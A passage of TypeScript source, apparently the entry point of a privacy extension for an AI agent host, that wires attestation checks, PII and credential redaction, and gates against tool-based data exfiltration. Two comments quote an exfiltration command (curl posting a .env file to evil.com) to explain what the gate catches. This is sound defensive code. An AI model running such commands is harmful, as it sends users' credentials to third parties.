// The Pi extension entry — what a marketplace install (or privateer-agent) loads.
//
// Wires the package together: installs the attestation dispatcher at extension-init
// (spike-proven to intercept provider TLS from here), registers the config-only
// privacy providers, patches venice / OpenRouter requests, tracks the current model
// to compute its posture, and adds a `/verify` command.
//
// This file is deliberately WIRING ONLY. Anything that can be a pure function of its
// inputs lives next door and is unit-tested there: the option shape in options.ts,
// Pi's structural surface in ext/pi-api.ts, badge rendering in ext/badge.ts, provider
// registration in ext/register.ts, payload read/redact in ext/payload.ts. What's left
// is the session state the gates genuinely share.

import { installAttestationDispatcher, dispatcherTransport } from "./attest/dispatcher.ts";
import { PRIVACY_PROVIDERS } from "./providers/catalog.ts";
import { veniceRequestPatch, openRouterZdrPatch } from "./ext/patches.ts";
import { verifyModelPosture, type VerifyOptions } from "./posture/verify.ts";
import { TIERS, type PrivacyTier } from "./posture/tiers.ts";
import { effectiveTier } from "./posture/effective.ts";
import {
  detectPii,
  scanPii,
  summarizePii,
  piiDetail,
  piiInline,
  hasSecrets,
  secretHits,
  newPii,
  mergePiiBaseline,
  type PiiHit,
  type PiiType,
} from "./pii/detect.ts";
import { compileAllow } from "./pii/allow.ts";
import { assessToolCall, type ToolAssessment } from "./ext/toolgate.ts";
import {
  rankSurface,
  summarizeSurface,
  surfaceReport,
  isRepoSupplied,
  type ToolInfoLike,
  type ToolSurfaceEntry,
} from "./surface/tools.ts";
import { readFileSync } from "node:fs";
import { createLedger, recordEgress, ledgerReport } from "./surface/ledger.ts";
import { toolResultText, redactToolResultContent } from "./ext/results.ts";
import { assessDowngrade, downgradeWarning } from "./posture/downgrade.ts";
import { rankModels, pickerOptionLabel, type PickerModel } from "./posture/picker.ts";
import { postureBadge, renderBadgeTo, DEFAULT_BADGE_SINKS } from "./ext/badge.ts";
import { registerable, providerConfig, nearApiKey } from "./ext/register.ts";
import { payloadText, redactPayloadPii } from "./ext/payload.ts";
import type { PiCtx, PiModel, PiUi, PiExtensionApiLike } from "./ext/pi-api.ts";
import type { PiPrivacyOptions } from "./options.ts";

// Re-exported so `pi-privacy/extension` (a published entry point) keeps resolving
// these, and so the common case is one import.
export type { PiPrivacyOptions } from "./options.ts";
export type { BadgeSink } from "./ext/badge.ts";
export type { PiCtx, PiModel, PiUi, PiExtensionApiLike } from "./ext/pi-api.ts";

// Verified-private tiers where PII needs no gate: an attested enclave can't read it,
// and a loopback endpoint never sends it. NOTE zdr-* is NOT here — a ZDR provider
// still SEES the data (it just doesn't retain it), so PII exposure remains.
function isVerifiedPrivate(tier: PrivacyTier | undefined): boolean {
  return tier === "tee-verified" || tier === "local";
}

export function makePiPrivacyExtension(opts: PiPrivacyOptions = {}) {
  const {
    installDispatcher = true,
    registerProviders = true,
    enforceOpenRouterZdr = false,
    onPosture,
    useDispatcherTransport = true,
    piiPolicy = "warn",
    piiUnattended = false,
    renderPiiAutoRedact,
    piiAllow = [],
    piiAllowDefaults = true,
    showBadge = true,
    badgeSinks = DEFAULT_BADGE_SINKS,
    badgeKey = "pi-privacy",
    renderBadge,
    toolExfilPolicy = "warn",
    toolResultPolicy = "warn",
    downgradePolicy = "warn",
    modelPicker = true,
    modelPickerCommand = "models",
    toolSurfacePolicy = "warn",
    toolSurfaceCommand = "surface",
    resolveTier,
    privateerVerifiedTee = false,
  } = opts;

  return function piPrivacy(pi: PiExtensionApiLike): void {
    if (installDispatcher) installAttestationDispatcher();

    if (registerProviders && typeof pi.registerProvider === "function") {
      for (const p of PRIVACY_PROVIDERS) {
        if (registerable(p)) pi.registerProvider(p.id, providerConfig(p));
      }
    }

    let currentProviderId: string | undefined;
    let currentModelId: string | undefined;
    // The VERIFIED tier of the current model (attestation result), cached for the PII
    // gate. Undefined until computed → the gate treats "unknown" as not-verified (safe).
    let currentTier: PrivacyTier | undefined;
    // Session PII decision so we don't re-prompt every turn once the user has chosen.
    let piiChoice: "ask" | "send" | "redact" = "ask";
    // Live unattended signal — read at gate time, every time, because hosts flip it
    // mid-session (privateer's shift+tab no-quarter toggle).
    const piiUnattendedNow = (): boolean =>
      typeof piiUnattended === "function" ? !!piiUnattended() : !!piiUnattended;
    // PII already decided about this session, per type, and what was decided. The
    // outbound payload carries the WHOLE conversation, so without this the same 12
    // emails re-prompt on every turn until you latch a blanket "remember for session"
    // — which is how a gate trains you to dismiss it. With it, a decision covers the
    // PII it was made about, and a NEW type (or one more of a type) prompts again.
    let piiSeen: Map<PiiType, number> = new Map();
    let piiLastAction: "send" | "redact" | undefined;
    // The allowlist matcher — values this session doesn't treat as PII at all.
    const piiAllowed = compileAllow(piiAllow, {
      defaults: piiAllowDefaults,
      warn: (m) => console.warn(`[pi-privacy] ${m}`),
    });
    const scanOpts = { allow: piiAllowed };
    // Session decision for the tool-exfil gate (allow egress with sensitive data).
    let toolAllow = false;
    // Session decision for the tool-RESULT (ingest) gate, so we don't re-prompt on
    // every credential-bearing result once the user has chosen.
    let resultChoice: "ask" | "redact" | "keep" = "ask";

    // ── tool-surface state ───────────────────────────────────────────────────
    // The tool inventory, snapshotted from an EVENT context (the command context is
    // restricted and may not expose getAllTools). Refreshed whenever we see a context
    // that has it, so a mid-session extension reload is picked up.
    let toolSnapshot: ToolInfoLike[] = [];
    // Name → classification, for the first-use provenance gate. Rebuilt with the
    // snapshot so the gate and the listing can never disagree about who supplied what.
    let surfaceByName = new Map<string, ToolSurfaceEntry>();
    // Egress we actually OBSERVED, as opposed to reach a tool merely declares. A
    // floor, never an accounting — see surface/ledger.ts.
    const ledger = createLedger();
    const surfaceOn = toolSurfacePolicy !== "off";
    const captureTools = (ctx: PiCtx | undefined) => {
      if (!surfaceOn || typeof ctx?.getAllTools !== "function") return;
      try {
        const tools = ctx.getAllTools();
        if (!Array.isArray(tools)) return;
        toolSnapshot = tools;
        surfaceByName = new Map(rankSurface(tools).map((e) => [e.name, e]));
      } catch {
        // A host that throws here still gets every other guard; the surface section
        // just reports what it has (nothing) rather than taking the extension down.
      }
    };

    // ── the first-use provenance gate (toolSurfacePolicy: "warn") ────────────────
    // Tools the user did not supply — they came with the working directory, or with a
    // --skill flag for this run. Answered once per tool, and once for all of them via
    // the session latch, because a gate that fires on every call is a gate people turn
    // off. Never fires for builtin/user/package: those you chose.
    const provenanceSeen = new Set<string>();
    let projectToolsAllowed = false;

    // Show the file a repo-supplied tool came from. Pi's own docs say to review skill
    // content before use; "[Show me the file]" is that advice made reachable at the
    // moment it matters, instead of a warning that assumes you already did.
    const previewSource = (entry: ToolSurfaceEntry): string => {
      const path = entry.sourcePath;
      if (!path) return "No source path recorded for this tool — nothing to show.";
      try {
        const text = readFileSync(path, "utf8");
        const clipped = text.length > 4000 ? `${text.slice(0, 4000)}\n… (truncated)` : text;
        return `${path}:\n${clipped}`;
      } catch (e) {
        // Say we couldn't rather than implying an empty file is a harmless one.
        return `Could not read ${path}: ${(e as Error).message}`;
      }
    };

    const guardProvenance = async (toolName: string, ctx?: PiCtx): Promise<"allow" | "block"> => {
      if (toolSurfacePolicy !== "warn" || projectToolsAllowed) return "allow";
      const entry = surfaceByName.get(toolName);
      // No inventory (a host that doesn't expose getAllTools) means we cannot say where
      // this tool came from — and a prompt that asserts a provenance we didn't
      // establish is exactly the overclaim this package refuses to make. Stay quiet.
      if (!entry || !isRepoSupplied(entry.provenance)) return "allow";
      if (provenanceSeen.has(toolName)) return "allow";

      const warning =
        `⚠ \`${toolName}\` was ${entry.concern}. It is about to run for the first time this session. ` +
        `This says where it came FROM, not that it is unsafe.`;

      if (!canPrompt(ctx)) {
        // No UI (print/JSON, automated): allow with a notice. Provenance is a signal,
        // not a detected secret — unlike a credential heading off-machine, there is
        // nothing here worth breaking an unattended run over.
        provenanceSeen.add(toolName);
        notify(ctx, warning, "warning");
        return "allow";
      }

      // Bounded: "Show me the file" re-asks, but only so many times, so a handler can
      // never sit in a prompt loop.
      for (let i = 0; i < 3; i++) {
        const choice = await ask(ctx, warning, [
          "Run it",
          "Show me the file",
          "Allow project tools for this session",
          "Block",
        ]);
        if (choice === "Show me the file") {
          notify(ctx, previewSource(entry), "info");
          continue;
        }
        if (choice === "Allow project tools for this session") {
          projectToolsAllowed = true;
          provenanceSeen.add(toolName);
          return "allow";
        }
        if (choice === "Run it") {
          // Latched only on an ALLOW. A block that latched would silently wave the
          // tool through the moment the model retried it.
          provenanceSeen.add(toolName);
          return "allow";
        }
        return "block"; // explicit "Block", or cancelled → the safe default
      }
      return "block"; // ran out of re-asks without a decision → safe default
    };

    // ── downgrade-guard state ────────────────────────────────────────────────
    // The tier the accumulated context was protected by at the moment of the last
    // switch, and the model to hand back to pi.setModel() if the user declines.
    let previousTier: PrivacyTier | undefined;
    let previousModel: unknown;
    // One prompt per transition: the guard runs twice (on the switch, using the new
    // model's ceiling, then again once attestation resolves the real tier, which can
    // only be lower). This latches after the first one that actually fires.
    let downgradeHandled = true;
    // What the last outbound payload was known to carry. Cached on EVERY request —
    // including verified-private ones, where the PII gate itself is skipped —
    // precisely so the guard knows what a private session accumulated before the
    // switch. Scanning is local, deterministic, and a few ms even on a full context.
    let contextHits: PiiHit[] = [];

    // The latest UI surface we've seen — captured from event contexts (the command
    // context is restricted), so refreshPosture() can paint the badge even though
    // model_select fires it without threading ctx through. `lastBadge` de-dupes so an
    // unchanged posture never re-renders (keeps a "notify" sink from spamming).
    let lastUi: PiUi | undefined;
    let lastCtx: PiCtx | undefined;
    let lastBadge: string | undefined;
    // Whether the host can actually prompt. Captured alongside the UI because
    // guards that run detached from an event (the downgrade guard's second pass,
    // after attestation resolves) have no ctx of their own — and treating a TUI as
    // non-interactive would silently apply the no-UI fallback instead of asking.
    let lastHasUI = false;
    const captureUi = (ctx: PiCtx | undefined) => {
      if (ctx?.ui) ((lastUi = ctx.ui), (lastCtx = ctx), (lastHasUI = !!ctx.hasUI));
    };

    // ── one definition of "can we ask the user?" ──────────────────────────────
    // Every gate needs the same two facts — is this host interactive, and does its
    // UI expose select() — and every gate needs the same fallback to the last event
    // context, because some run detached from one (the downgrade guard's second pass
    // fires after attestation resolves, with no ctx of its own). Spelling this out
    // per-gate is how they drift: a gate that forgets the fallback silently applies
    // its no-UI branch on a host that could have asked.
    const uiOf = (ctx?: PiCtx): PiUi | undefined => ctx?.ui ?? lastUi;
    const canPrompt = (ctx?: PiCtx): boolean =>
      (ctx?.hasUI ?? lastHasUI) && typeof uiOf(ctx)?.select === "function";
    // Ask, once, with the capability check already made. Returns undefined when the
    // host can't prompt OR the user cancelled — callers treat both as "no answer",
    // which must always resolve to their SAFE default, never to "proceed".
    const ask = (ctx: PiCtx | undefined, title: string, options: string[]): Promise<string | undefined> =>
      canPrompt(ctx) ? uiOf(ctx)!.select!(title, options) : Promise.resolve(undefined);
    const notify = (ctx: PiCtx | undefined, message: string, level: string) => uiOf(ctx)?.notify?.(message, level);

    // The attestation inputs for the current model. Shared by the badge refresh and
    // /verify so the command can never verify against different settings than the
    // badge reports — the two answering differently would be the worst possible bug
    // in a package whose whole claim is that the badge is earned.
    const postureOpts = (): VerifyOptions => ({
      apiKey: currentProviderId === "nearai" ? nearApiKey() : undefined,
      zdrEnforced: currentProviderId === "openrouter" && enforceOpenRouterZdr,
      transport: useDispatcherTransport && installDispatcher ? dispatcherTransport : undefined,
    });
    const paintBadge = () => {
      if (!showBadge || !lastUi) return;
      const badge = postureBadge(currentTier);
      if (badge === lastBadge) return; // unchanged → no-op
      let rendered = false;
      if (renderBadge) ((renderBadge(badge, currentTier, lastCtx!)), (rendered = true));
      else {
        for (const sink of badgeSinks) {
          if (renderBadgeTo(lastUi, sink, badgeKey, badge, currentTier)) {
            rendered = true;
            break;
          }
        }
      }
      if (rendered) lastBadge = badge; // only commit once something actually drew it
    };

    // Recompute posture for the current model; cache the tier and publish the badge.
    const refreshPosture = async () => {
      if (!currentProviderId || !currentModelId) return;
      // A host-supplied resolver (e.g. a private account channel pi-privacy doesn't
      // know) wins — otherwise use the built-in verified posture.
      if (resolveTier) {
        const t = await resolveTier(currentProviderId, currentModelId);
        if (t !== undefined) {
          currentTier = t;
          onPosture?.({ providerId: currentProviderId, modelId: currentModelId, tier: t });
          paintBadge();
          void guardDowngrade(t);
          return;
        }
      }
      const result = await verifyModelPosture(currentProviderId, currentModelId, postureOpts());
      currentTier = result.tier;
      onPosture?.(result);
      paintBadge();
      // Re-check with the VERIFIED tier: a model whose ceiling looked fine can land
      // lower (attestation failed → tee-unverified), and that's still a downgrade.
      void guardDowngrade(result.tier);
    };

    // The posture-downgrade guard. Runs on a model switch and again once attestation
    // resolves, because the incoming tier can only get WORSE than its ceiling.
    // Fires only when the tier actually drops AND the context is known to carry
    // sensitive material — a bare tier change is what the badge is for.
    const guardDowngrade = async (toTier: PrivacyTier | undefined, ctx?: PiCtx) => {
      if (downgradePolicy === "off" || downgradeHandled) return;
      const a = assessDowngrade(previousTier, toTier, contextHits);
      if (!a.downgrade || a.severity === "none") return;
      downgradeHandled = true; // one prompt per transition

      const label = currentProviderId
        ? `${currentProviderId}${currentModelId ? `/${currentModelId}` : ""}`
        : undefined;
      const warning = downgradeWarning(a, contextHits, label);
      const revert = async () => {
        if (previousModel === undefined || typeof pi.setModel !== "function") {
          // Nothing to revert to (or the host can't switch) — say so rather than
          // implying the session was protected.
          notify(ctx, `${warning} Could not revert the switch automatically.`, "warning");
          return;
        }
        await pi.setModel(previousModel);
        notify(ctx, `Reverted to ${TIERS[a.from].label} — session context stays put.`, "info");
      };

      if (downgradePolicy === "block") return revert();

      if (canPrompt(ctx)) {
        const choice = await ask(ctx, warning, [
          "Stay on the previous model",
          "Switch anyway",
          "Switch, redacting PII from now on",
        ]);
        if (choice === "Switch anyway") return;
        if (choice === "Switch, redacting PII from now on") {
          piiChoice = "redact";
          return;
        }
        return revert(); // explicit "Stay", or cancelled → the safe default
      }

      // No UI (print/JSON, automated): mirror the tool gate — a CREDENTIAL following
      // the session downhill is reverted (loud + safe), mere PII passes with a notice.
      if (a.severity === "secret") return revert();
      notify(ctx, warning, "warning");
    };

    // Snapshot the tool inventory once the session exists. Deliberately NOT done in
    // captureUi(): that runs on every request and tool call, and getAllTools() builds
    // a fresh array each time. The tool set only changes on a session start or an
    // extension reload, both of which re-fire this.
    pi.on("session_start", (_event, ctx) => {
      captureUi(ctx);
      captureTools(ctx);
    });

    pi.on("model_select", (event, ctx) => {
      const model = event?.model as PiModel | undefined;
      // Snapshot what the context was protected by BEFORE overwriting it — that's
      // the ceiling the accumulated history was written under.
      previousTier = currentTier;
      previousModel = event?.previousModel;
      downgradeHandled = false; // arm the guard for this transition
      // A different PROVIDER is a different audience: answering "send it" to one
      // company is not answering it for the next one, so the already-decided baseline
      // is dropped and the gate re-arms. An explicit "remember for session" is YOUR
      // standing instruction and deliberately survives.
      if (model?.provider !== currentProviderId) {
        piiSeen = new Map();
        piiLastAction = undefined;
      }
      currentProviderId = model?.provider;
      currentModelId = model?.id;
      captureUi(ctx);
      currentTier = undefined; // don't show the old model's badge while re-verifying
      paintBadge(); // pending marker until attestation resolves
      // Check against the incoming model's CEILING immediately, so the warning lands
      // before a turn can start; refreshPosture() re-checks with the verified tier.
      void guardDowngrade(
        effectiveTier(currentProviderId ?? "", {
          zdrEnforced: currentProviderId === "openrouter" && enforceOpenRouterZdr,
        }),
        ctx,
      );
      void refreshPosture();
    });

    // Per-provider request patches + the posture-aware PII gate.
    pi.on("before_provider_request", async (event, ctx) => {
      captureUi(ctx); // keep the badge alive even if model_select had no UI
      paintBadge();
      let payload = event?.payload;
      // Provider-specific patches first (scoped to the current provider).
      if (currentProviderId === "venice") payload = veniceRequestPatch(payload);
      else if (currentProviderId === "openrouter" && enforceOpenRouterZdr) payload = openRouterZdrPatch(payload);

      // Scan the outbound payload — the full context that would be re-sent — and
      // cache the result for the downgrade guard. Done for EVERY tier, including
      // verified-private ones where the gate below is skipped: knowing what a
      // private session accumulated is the whole basis for guarding the switch out
      // of it. (Local + deterministic; a few ms on a full context.)
      const scan = scanPii(payloadText(payload), scanOpts);
      const hits = scan.hits;
      contextHits = hits;

      // PII gate: only below a VERIFIED-private tier (TEE-verified/local are safe —
      // the provider can't read the data), and only where we can actually prompt.
      if (piiPolicy !== "off" && !isVerifiedPrivate(currentTier)) {
        if (hits.length > 0) {
          let action: "send" | "redact" =
            piiChoice !== "ask" ? piiChoice : piiPolicy === "redact" ? "redact" : "send";
          // What is new since the last decision. Nothing new → the previous answer
          // still applies and we stay quiet; the moment something appears that was
          // never answered for, we ask again.
          const fresh = newPii(hits, piiSeen);
          const decided = piiChoice !== "ask" ? piiChoice : piiLastAction;
          if (fresh.length === 0 && decided) action = decided;

          if (fresh.length > 0 && piiChoice === "ask" && piiPolicy === "warn" && piiUnattendedNow()) {
            // Unattended (the host's no-quarter / step-away switch): nobody is at the
            // keyboard to answer, so the question is swallowed the SAFE way — redact
            // and send — and the decision surfaces as OUTPUT instead of a prompt:
            // what was masked (the same masked samples the prompt's detail view
            // shows, never a raw value) and where the redacted payload went.
            action = "redact";
            const notice =
              `⚑ unattended — PII auto-redacted before send: ${piiInline(scan)} → ` +
              `${TIERS[currentTier ?? "standard"].label} channel. ` +
              `Best-effort structured detection only, not a guarantee.`;
            const rendered = renderPiiAutoRedact?.(notice);
            notify(ctx, rendered ?? notice, rendered ? "info" : "warning");
          } else if (fresh.length > 0 && piiChoice === "ask" && piiPolicy === "warn" && canPrompt(ctx)) {
            const tierLabel = TIERS[currentTier ?? "standard"].label;
            const kind = hasSecrets(hits) ? "secrets/PII" : "structured PII";
            const again = piiLastAction ? ` (${summarizePii(fresh)} new since your last answer)` : "";
            const head =
              `⚠ ${summarizePii(hits)} detected${again} — sending to an unverified channel (${tierLabel}). ` +
              `Best-effort ${kind} detection only, not a guarantee.`;
            // "Show what was detected" re-opens the prompt with the masked breakdown
            // appended, so the detail is on the same screen as the choice.
            let title = head;
            for (let round = 0; round < 2; round++) {
              const options = [
                "Send as-is",
                "Redact PII",
                ...(round === 0 ? ["Show what was detected"] : []),
                "Redact + remember for session",
                "Send + remember for session",
              ];
              const choice = await ask(ctx, title, options);
              if (choice === "Show what was detected") {
                title = `${head}\n\n${piiDetail(scan)}`;
                continue;
              }
              if (choice === "Redact PII") action = "redact";
              else if (choice === "Redact + remember for session") ((action = "redact"), (piiChoice = "redact"));
              else if (choice === "Send + remember for session") ((action = "send"), (piiChoice = "send"));
              else action = "send"; // "Send as-is" or cancelled
              break;
            }
          }
          // Record what this payload's PII was decided to be, so the same PII does
          // not ask again. Only the counted hits — an allowlisted value was never a
          // question, and a hit we never got to ask about (no UI) is still answered
          // here, since we did act on it.
          piiSeen = mergePiiBaseline(piiSeen, hits);
          piiLastAction = action;
          if (action === "redact") payload = redactPayloadPii(payload, piiAllowed);
        }
      }

      return payload === event?.payload ? undefined : payload;
    });

    // ── the exfil gate, shared by the model's tools and the user's ! commands ────
    // Deliberately INDEPENDENT of the model's tier — a verified-TEE or ZDR model does
    // nothing to stop a bash/web tool shipping data to a third party. Best-effort
    // egress + structured-detection heuristic, never a guarantee.
    interface EgressVerdict {
      warning: string;
      reason: string;
      secret: boolean;
    }

    // Judge one already-assessed outbound call. Takes the assessment rather than
    // computing it, so the caller can feed the SAME verdict to the surface ledger —
    // one assessment per call, no chance of the gate and the ledger disagreeing about
    // what happened. `label` is how the call is named to the user. undefined =
    // nothing to fire on. Pure: no prompts, no state.
    const egressVerdict = (assessment: ToolAssessment, label: string, input: unknown): EgressVerdict | undefined => {
      if (!assessment.egress) return undefined;

      const hits = detectPii(payloadText(input), scanOpts);
      const files = assessment.sensitiveFiles ?? [];
      // Neither a literal secret nor a credential FILE in the egress path → nothing
      // we can honestly claim to have caught.
      if (hits.length === 0 && files.length === 0) return undefined;

      // A credential store heading off-machine is credential-severity even though the
      // command carries no literal secret: `curl -d @.env` sends the whole file, and
      // the reference is the only thing detection can see.
      const secret = hasSecrets(hits) || files.length > 0;
      const what = [files.length ? `${files.join(", ")} contents` : "", hits.length ? summarizePii(hits) : ""]
        .filter(Boolean)
        .join(" + ");
      const dest = assessment.target ? ` → ${assessment.target}` : "";
      const reason = `pi-privacy blocked ${secret ? "credential" : "PII"} exfiltration via ${label}`;
      const warning =
        `⚠ ${label} is about to send ${what} off this machine${dest}. ` +
        `A private (TEE/ZDR) model does NOT protect a tool call. Best-effort detection, not a guarantee.`;
      return { warning, reason, secret };
    };

    // One decision path for both callers: one session latch, one set of prompts, one
    // no-UI fallback — so a ! command can't be judged more leniently than the same
    // command run by the model.
    const decideEgress = async (v: EgressVerdict, ctx?: PiCtx): Promise<"allow" | "block"> => {
      // Already allowed this session → just remind and let it through.
      if (toolAllow) {
        notify(ctx, v.warning, "warning");
        return "allow";
      }
      if (toolExfilPolicy === "block") return "block";

      // warn: prompt where we can.
      if (canPrompt(ctx)) {
        const choice = await ask(ctx, v.warning, ["Block", "Allow once", "Allow for session"]);
        if (choice === "Allow for session") {
          toolAllow = true;
          return "allow";
        }
        if (choice === "Allow once") return "allow";
        return "block"; // explicit "Block", or cancelled → the safe default
      }

      // No UI (print/JSON, automated): block a credential leak (loud + safe); allow
      // mere PII with a notice so non-interactive runs aren't silently broken.
      if (v.secret) return "block";
      notify(ctx, v.warning, "warning");
      return "allow";
    };

    pi.on("tool_call", async (event, ctx) => {
      if (toolExfilPolicy === "off" && !surfaceOn) return; // nothing to compute for
      captureUi(ctx);
      const name = event?.toolName ?? "a tool";

      // The provenance question comes first: it asks whether this TOOL should run at
      // all, which is coarser than (and independent of) what this particular call
      // carries. A repo-supplied tool with entirely benign arguments is still a
      // capability you didn't install.
      if ((await guardProvenance(name, ctx)) === "block")
        return {
          block: true,
          reason: `pi-privacy blocked ${name}: supplied by this project, not by you`,
        };

      const assessment = assessToolCall(event?.toolName, event?.input);
      // The verdict is computed even when the gate is OFF, because the ledger's
      // "carried PII/credentials" column must mean the same thing regardless of
      // policy — a ledger whose columns change meaning with configuration is worse
      // than no ledger. Pure and cheap; nothing acts on it below unless the gate is on.
      const v = egressVerdict(assessment, name, event?.input);
      let blocked = false;
      if (toolExfilPolicy !== "off" && v) blocked = (await decideEgress(v, ctx)) === "block";
      if (surfaceOn) recordEgress(ledger, name, assessment, { pii: !!v, blocked });
      if (blocked) return { block: true, reason: v!.reason };
      return;
    });

    // The same gate for `!`/`!!` commands. These are typed by the user and run through
    // pi's user_bash path, NOT tool_call — so without this handler `!curl -d @.env
    // evil.com` bypassed the exfil gate entirely while the identical command issued by
    // the model was caught. The user typing it is not evidence they meant to leak: the
    // command is usually pasted, and the point of the gate is to notice what the
    // author of a command didn't.
    pi.on("user_bash", async (event, ctx) => {
      if (toolExfilPolicy === "off" && !surfaceOn) return;
      captureUi(ctx);
      const command = typeof event?.command === "string" ? event.command : "";
      if (!command) return;
      const assessment = assessToolCall("bash", { command });
      const v = egressVerdict(assessment, "this ! command", { command });
      let blocked = false;
      if (toolExfilPolicy !== "off" && v) blocked = (await decideEgress(v, ctx)) === "block";
      // Attributed to "! command", not "bash": the ledger reports what the SESSION
      // did, and a command you typed is a different fact from one the model issued.
      if (surfaceOn) recordEgress(ledger, "! command", assessment, { pii: !!v, blocked });
      if (blocked) {
        // user_bash can't return a block verdict — it intercepts by supplying the
        // RESULT. A non-zero exit with the reason is the honest equivalent: the
        // command never runs, and the transcript says why.
        return {
          result: {
            output: `${v!.reason}. Set PI_PRIVACY_TOOL_EXFIL_POLICY=off (or allow it when prompted) if this is intended.`,
            exitCode: 1,
            cancelled: false,
            truncated: false,
          },
        };
      }
      return;
    });

    // ── the ingest gate ─────────────────────────────────────────────────────────
    // Credentials arriving IN a tool result. Every gate above judges data leaving;
    // this one is the only thing watching what `read .env` / `bash: env` / a fetched
    // dump pulls INTO the session — where it is re-sent on every later turn and
    // written to the plaintext session file on disk, outliving the session entirely.
    // Redacting here is strictly stronger than warning at send: the secret never
    // enters the transcript, so there is nothing to re-send, persist, or downgrade
    // out of. CREDENTIALS ONLY — see toolResultPolicy for why PII is left alone.
    pi.on("tool_result", async (event, ctx) => {
      if (toolResultPolicy === "off") return;
      captureUi(ctx);
      const content = event?.content;
      const hits = secretHits(detectPii(toolResultText(content), scanOpts));
      if (hits.length === 0) return;

      const summary = summarizePii(hits);
      const warning =
        `⚠ ${event?.toolName ?? "a tool"} returned ${summary}. Keeping ${hits.length === 1 && hits[0].count === 1 ? "it" : "them"} ` +
        `in context means re-sending to the provider on every later turn, and writing to the session file on disk in plaintext. ` +
        `Best-effort secret detection, not a guarantee.`;

      let action: "redact" | "keep" =
        resultChoice !== "ask" ? resultChoice : toolResultPolicy === "redact" ? "redact" : "keep";

      if (resultChoice === "ask" && toolResultPolicy === "warn") {
        if (canPrompt(ctx)) {
          const choice = await ask(ctx, warning, [
            "Redact the credentials",
            "Keep them in context",
            "Redact for the rest of the session",
            "Keep for the rest of the session",
          ]);
          if (choice === "Redact the credentials") action = "redact";
          else if (choice === "Redact for the rest of the session") ((action = "redact"), (resultChoice = "redact"));
          else if (choice === "Keep for the rest of the session") ((action = "keep"), (resultChoice = "keep"));
          else action = "keep"; // "Keep them in context" or cancelled
        } else {
          // No UI (print/JSON, automated): redact, mirroring the exfil gate's
          // credential default — loud + safe beats silently persisting a key.
          action = "redact";
          notify(ctx, `${warning} Redacted (no UI to ask).`, "warning");
        }
      }

      if (action !== "redact") return;
      const redacted = redactToolResultContent(content, undefined, piiAllowed);
      if (redacted === undefined) {
        // Detected in a shape we can't rewrite safely. Say so — reporting a
        // redaction that didn't happen is exactly the overclaim this package exists
        // to prevent.
        notify(
          ctx,
          `Could not redact ${summary} from ${event?.toolName ?? "the tool"} result — unrecognized result shape. It stays in context.`,
          "warning",
        );
        return;
      }
      return { content: redacted };
    });

    // ── the tool-surface section, shared by /verify and /surface ────────────────
    // /verify answers "is my model channel private?". This answers the question no
    // per-call gate can: who else is in this session, and who supplied them. Kept
    // report-only in this phase — it never blocks, never prompts, and every line
    // states its evidence grade (a tool's DECLARED reach vs egress we OBSERVED).
    const surfaceSection = (ctx: PiCtx | undefined, full: boolean): string => {
      captureTools(ctx); // refresh if THIS context exposes the tool list
      const lines: string[] = [];
      const entries = rankSurface(toolSnapshot);

      if (entries.length === 0) {
        // Say it plainly — but only when the user ASKED for the listing (/surface).
        // An empty inventory rendered as "0 tools" would read as "nothing else is in
        // the room", which is the opposite of what we know; and a host that can't
        // tell us anything shouldn't add a line to every /verify. When /verify has
        // nothing to report, the section is omitted entirely.
        if (full) lines.push("Tools     inventory unavailable — this host did not expose the tool list.");
      } else {
        const report = surfaceReport(entries, !full);
        lines.push(`Tools     ${report[0]}`);
        for (const l of report.slice(1)) lines.push(`          ${l}`);
        if (summarizeSurface(entries).notYours > 0)
          lines.push(
            "          ⚠ marks a tool that came with this working directory or a CLI flag, not from your " +
              "configuration. That is where it came FROM — pi-privacy does not judge what it does.",
          );
      }

      const obs = ledgerReport(ledger);
      if (obs.length) {
        lines.push(`Observed  ${obs[0]}`);
        for (const l of obs.slice(1)) lines.push(`          ${l}`);
        // The limit is part of the report, not a footnote elsewhere: this ledger only
        // sees egress that flowed through a tool call. An extension calling fetch()
        // in its own handler is invisible to it — pi-privacy is an extension too and
        // has no privileged view of its peers.
        lines.push(
          "          (observed via tool calls only — an extension's own fetch() never appears here, so this is a floor)",
        );
      }
      return lines.join("\n");
    };

    if (typeof pi.registerCommand === "function") {
      pi.registerCommand("verify", {
        description: "Verify the current model's privacy posture (TEE attestation)",
        handler: async (_args, ctx) => {
          if (!currentProviderId || !currentModelId) {
            ctx.ui?.notify?.("No model selected.", "warning");
            return;
          }
          const res = await verifyModelPosture(currentProviderId, currentModelId, postureOpts());
          const info = TIERS[res.tier];
          const detail = res.teePosture ? ` [${res.teePosture}]` : "";
          const err = res.error ? ` — ${res.error}` : "";
          ctx.ui?.notify?.(`${info.label}${detail}: ${info.blurb}${err}`, "info");
          // Then the EVIDENCE. The checks here are pragmatic ones suited to an
          // interactive agent, not a full verifier — so the report that produced
          // the verdict has to be inspectable, or "verified" is just our word for
          // it. Emitting it is what lets a user take the same bytes to
          // nearai/cloud-verifier or tinfoil-cli and check our work.
          if (res.attestation !== undefined) {
            let report: string;
            try {
              report = JSON.stringify(res.attestation, null, 2);
            } catch {
              report = String(res.attestation); // never let display kill /verify
            }
            ctx.ui?.notify?.(`attestation report (verify independently):\n${report}`, "info");
          }
          // The second axis. A verified enclave says nothing about who ELSE can read
          // this session, so /verify is incomplete without it.
          if (surfaceOn) {
            const section = surfaceSection(ctx, false);
            if (section) ctx.ui?.notify?.(section, "info");
          }
        },
      });

      // The full tool-surface listing (phase 1 of the surface axis): every tool by
      // provenance, plus egress actually observed. Report-only.
      if (surfaceOn) {
        pi.registerCommand(toolSurfaceCommand, {
          description: "List the session's tools by who supplied them, plus observed egress",
          handler: (_args, ctx) => {
            ctx.ui?.notify?.(surfaceSection(ctx, true), "info");
          },
        });
      }

      // The privacy-ranked model picker (#2). Lists the models the user can actually
      // use, strongest privacy first, each labeled with what it can offer — so privacy
      // is something you PICK, not just something the badge reports afterward.
      if (modelPicker) {
        pi.registerCommand(modelPickerCommand, {
          description: "Pick a model ranked by privacy (verified TEE / on-device / ZDR first)",
          handler: async (_args, ctx) => {
            const reg = ctx.modelRegistry;
            // getAvailable() = models with auth configured (the honest, switchable set).
            // Fall back to getAll() so the picker still ranks when availability is
            // unknown (some hosts/modes may not populate auth state here).
            const models: PickerModel[] =
              reg?.getAvailable?.() ?? reg?.getAll?.() ?? [];
            if (models.length === 0) {
              ctx.ui?.notify?.(
                "No models to rank (none with configured auth were found).",
                "warning",
              );
              return;
            }

            const ranked = rankModels(models, {
              zdrEnforced: enforceOpenRouterZdr,
              verifiedTee: privateerVerifiedTee,
            });
